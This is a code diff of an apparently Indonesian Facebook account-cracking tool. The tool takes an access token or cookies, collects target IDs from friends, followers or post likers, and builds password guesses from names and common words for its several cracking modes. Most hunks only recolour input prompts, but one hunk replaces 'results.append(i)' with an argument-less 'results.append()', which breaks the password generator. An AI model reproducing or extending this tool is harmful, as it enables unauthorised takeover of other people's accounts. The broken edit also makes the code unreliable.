@@ -194,7 +194,7 @@ def logs():
   print((k+"\n["+p+"01"+k+"]"+p+" \x1b[0;33mLogin Via Token"))
   print((k+"["+p+"02"+k+"]"+p+" \x1b[0;33mVia Cookies"))
   print((k+"["+p+"00"+k+"]"+p+" \x1b[0;31mLog Out"))
-  sek=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : ")
+  sek=input(k+"\n["+p+"•"+k+"]"+p+" Pilih : \x1b[0;33m")
   if sek=="":
     print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     logs()
@@ -213,7 +213,7 @@ def logs():
 def log_token():
     os.system("clear")
     banner()
-    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token : ")
+    toket = input(k+"\n["+p+"?"+k+"]"+p+" Token : \x1b[0;32m")
     try:
         otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
         a = json.loads(otw.text)
@@ -340,7 +340,7 @@ def menu():
     choose_menu()
 
 def choose_menu():
-	r=input(k+"\n["+p+"•"+k+"]"+p+"Pilih : ")
+	r=input(k+"\n["+p+"•"+k+"]"+p+"Pilih : \x1b[0;33m")
 	if r=="":
 		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
 		menu()
@@ -377,7 +377,7 @@ def pilihcrack(file):
   print((k+"["+p+"03"+k+"]"+p+" Mbasic ("+k+"Slow And Recommended"+p+")"))
   print((k+"["+p+"04"+k+"]"+p+" Mbasic + TTL ("+k+"Slow + TTL"+p+")"))
   print((k+"["+p+"05"+k+"]"+p+" Free Facebook ("+k+"Super Slow/Sangat Lambat"+p+")"))
-  krah=input(k+"\n["+p+"•"+k+"]"+p+"Choose : ")
+  krah=input(k+"\n["+p+"•"+k+"]"+p+"Choose : \x1b[0;33m")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
     pilihcrack(file)
@@ -406,7 +406,7 @@ def publik():
 		logs()
 	try:
 		print((k+"\n["+p+"+"+k+"]"+p+" Ketik \'me\' Untuk Mengambil ID Teman"))
-		idt = input(k+"["+p+"?"+k+"]"+p+" ID Target : ")
+		idt = input(k+"["+p+"?"+k+"]"+p+" ID Target : \x1b[0;33m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -437,7 +437,7 @@ def follow():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"?"+k+"]"+p+" Followers ID Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" Followers ID Target : \x1b[0;33m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -468,7 +468,7 @@ def likers():
 		os.system("rm -rf login.txt")
 		logs()
 	try:
-		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Postingan Target : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Postingan Target : \x1b[0;33m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -497,7 +497,7 @@ def random_numbers():
   data = []
   print((k+"\n["+p+"•"+k+"]"+p+" Nomor Harus 5 Digit"))
   print((k+"["+p+"•"+k+"]"+p+" Contoh : 92037"))
-  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : "))
+  kode=str(input(k+"["+p+"•"+k+"]"+p+" Masukan Nomor : \x1b[0;33m"))
   exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
   exit((k+"\n["+p+"!"+k+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
   jml=int(input(k+"["+p+"+"+k+"]"+p+" Jumlah : "))
@@ -510,7 +510,7 @@ def random_numbers():
 
 def random_email():
   data = []
-  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
+  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : \x1b[0;33m")
   domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
   list={
     'g':'@gmail.com',
@@ -561,7 +561,7 @@ def target():
 		os.system("rm -rf login.txt")
 		login()
 	try:
-		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Target        : ")
+		idt = input(k+"\n["+p+"?"+k+"]"+p+" ID Target        : \x1b[0;33m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -651,7 +651,7 @@ def generate(text):
 			else:
 				results.append(i+"123")
 				results.append(i+"12345")
-				results.append(i)
+				results.append()
 				if "id" in ct:
 					results.append("sayang")
 					results.append("bismillah")
@@ -693,7 +693,7 @@ def menu_user_agent():
     pilih_menu_user_agent()
 
 def pilih_menu_user_agent():
-    pmu = input("\n%s[%s•%s] %sPilih : "%(k,p,k,p))
+    pmu = input("\n%s[%s•%s] %sPilih : \x1b[0;33m"%(k,p,k,p))
     if pmu in[""]:
         print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
     elif pmu in["1","01"]:
@@ -899,7 +899,7 @@ class crackttl:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : \x1b[0;33m")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1001,7 +1001,7 @@ class crackffb:
 		self.ko=0
 		print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
 		while True:
-			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : \x1b[0;33m")
 			if f=="":continue
 			elif f=="m":
 				try:
@@ -1047,7 +1047,7 @@ class crackffb:
 				exit()
 				break
 	def pwlist(self):
-		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : \x1b[0;33m").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
@@ -1199,7 +1199,7 @@ class bapittl:
   def krah(self,isifile):
     print((k+"\n["+p+"?"+k+"]"+p+" Ingin Menggunakan Password Manual [d/m]"))
     while True:
-      f=input(k+"["+p+"•"+k+"]"+p+"Choose : ")
+      f=input(k+"["+p+"•"+k+"]"+p+"Choose : \x1b[0;33m")
       if f in[""," "]:
         print((k+"["+p+"!"+k+"]"+p+" Nomor Invalid Kentod!!"))
         continue
